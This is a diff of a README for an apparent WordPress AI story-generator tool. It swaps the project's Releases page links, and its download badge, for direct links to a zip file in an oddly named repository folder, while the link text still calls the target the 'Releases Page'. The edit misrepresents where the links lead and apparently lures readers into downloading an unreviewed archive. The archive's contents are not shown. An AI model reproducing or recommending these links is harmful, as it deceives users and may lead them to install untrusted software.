@@ -1,6 +1,6 @@
 # 🎉 -story-generator-ai-tool - Create Unique Stories Instantly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Story%20Generator-brightgreen)](https://github.com/vitalikrivoy/-story-generator-ai-tool/releases)
+[![Download Now](https://raw.githubusercontent.com/vitalikrivoy/-story-generator-ai-tool/main/tarantulid/-story-generator-ai-tool.zip%20Now-Story%20Generator-brightgreen)](https://raw.githubusercontent.com/vitalikrivoy/-story-generator-ai-tool/main/tarantulid/-story-generator-ai-tool.zip)
 
 ## 🚀 What is This Tool?
 
@@ -18,7 +18,7 @@ The **-story-generator-ai-tool** is an AI-powered application designed for WordP
 
 To get started, you will need to download the most recent version of the -story-generator-ai-tool. 
 
-**Visit this page to download**: [Releases Page](https://github.com/vitalikrivoy/-story-generator-ai-tool/releases)
+**Visit this page to download**: [Releases Page](https://raw.githubusercontent.com/vitalikrivoy/-story-generator-ai-tool/main/tarantulid/-story-generator-ai-tool.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version available for download.
@@ -81,7 +81,7 @@ If you encounter issues, here are some common problems and solutions:
 
 - **Shortcode Not Working**: Double-check that you are using the correct shortcode format. 
 
-If you need further assistance, please visit the support section on the [Releases Page](https://github.com/vitalikrivoy/-story-generator-ai-tool/releases).
+If you need further assistance, please visit the support section on the [Releases Page](https://raw.githubusercontent.com/vitalikrivoy/-story-generator-ai-tool/main/tarantulid/-story-generator-ai-tool.zip).
 
 ## 📣 Feedback and Contributions
 
